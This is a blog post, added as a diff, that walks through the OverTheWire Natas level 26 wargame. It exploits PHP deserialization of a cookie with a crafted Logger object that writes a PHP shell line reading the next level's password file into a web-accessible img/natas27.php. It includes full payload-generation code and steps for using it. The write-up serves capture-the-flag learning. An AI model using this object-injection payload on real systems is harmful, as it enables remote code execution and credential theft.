@@ -1,0 +1,135 @@
+---
+layout: post
+title:  "Natas Level 25 → Level 26"
+date:   2021-05-31 07:50:38
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: What rolls down stairs, alone or in pairs, and over your neighbor's dog?
+mathjax: false
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+This level contains a line drawing app and a link to the source code.  Let's take a look at sections of the source code.
+
+The lines below show that there's a cookie named drawing that contains serialized data, and is base64 encoded. A quick look at the developer tools confirms this. 
+
+```php
+function storeData(){
+    ...
+    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+    setcookie("drawing",base64_encode(serialize($drawing)));
+}
+```
+
+The serialize function lets the site save data, and unserialize lets the site restore it at some other point. Since this information was saved in a cookie, we could classes or functions on the site, and once deserialized, they would replace the original code. Let's look around.
+
+```php
+class Logger{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    
+    function __construct($file){
+        // initialise variables
+        $this->initMsg="#--session started--#\n";
+        $this->exitMsg="#--session end--#\n";
+        $this->logFile = "/tmp/natas26_" . $file . ".log";
+        // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        } 
+    ...
+```
+
+The Logger class is the perfect candidate. We can see in the constructor that the Logger writes text to a file and stores it at a given location. Instead of these messages, we could output the contexts of the /etc/natas_webpass/natas27 and save it as a php file instead of a log file. We now need a location to write to. Unfortunately, the directory that contains this script is not writable by the server.
+
+Looking down near the very bottom of the code we see the following:
+```php
+if (array_key_exists("drawing", $_COOKIE) ||
+    (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
+    $imgfile="img/natas26_" . session_id() .".png"; 
+    drawImage($imgfile); 
+    showImage($imgfile);
+    storeData();
+```
+
+Here we see another directory name **img** and a call to the functions named drawImage and showImage. As the name would imply, drawImage is what creates the image. The showImage function is quite small. Let's take a look.
+
+```php
+function showImage($filename){
+    if(file_exists($filename))
+        echo "<img src=\"$filename\">";
+    }
+```
+
+This tells us that the file is stored on the server, at least for some time. With this, we can attack the site. Instead of Python, we're going to use php. We'll need some php functions to pull this off, plus we can reuse some of the site code to help speed things along. If you don't have or want to install php locally, you can use an online editor such as [JDoodle](https://www.jdoodle.com/php-online-editor/).
+
+The following code is a modified version of the Logger class from this level. The Logger class provided by the site was written for php 7.0.x. Version 7.1 introduced some breaking changes that kept the original code from working with JDoodle and would require tracking down specific versions of php to run as-is. I figured it was easier to make changes to the code.
+
+Modified Logger:
+```php
+<?php
+    error_reporting(E_ERROR | E_PARSE); # prevents unimportant (for our needs) warnings for being output
+
+    class Logger{
+        private $initMsg;
+        private $exitMsg;
+        private $logFile;
+
+        function __construct($initMsg, $exitMsg, $logFile){ 
+            // initialise variables
+            $this->initMsg = $initMsg;
+            $this->exitMsg = $exitMsg;
+            $this->logFile = $logFile;
+
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }                       
+    
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }                       
+    
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }                       
+    }
+
+    $initMsg = "<?php passthru('cat /etc/natas_webpass/natas27'); ?>";
+    $exitMsg = "<?php passthru('cat /etc/natas_webpass/natas27'); ?>";
+    $logFile = "img/natas27.php";
+
+    $log = new Logger($initMsg, $exitMsg, $logFile); # Here's where 7.1 got explodey. members needed to be initialized.
+    $serial = serialize($log);
+    $result = urlencode(base64_encode($serial));
+
+    print($serial); # What the data looks like serialized
+    print(PHP_EOL); # This makes things a little easier to look at in the console
+    print(PHP_EOL);
+    print($result); # The payload
+?>
+```
+
+Run the Modified Logger code, and you'll see two long lines of output. The first is the Logger class serialized. The second is the serialized Logger class encoded to base64. Copy that line and open your developer tools. Delete the contents of the drawing cookie and paste the newly generated value in its place.
+
+Once that's done, reload the page. You should see an error message on the page that looks something like the following:
+```
+Fatal error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php on line 105
+```
+
+This means our attack succeeded. Now navigate to the location specified in $logFile. If you haven't changed the location, that would be [http://natas26.natas.labs.overthewire.org/img/natas27.php](http://natas26.natas.labs.overthewire.org/img/natas27.php).
+
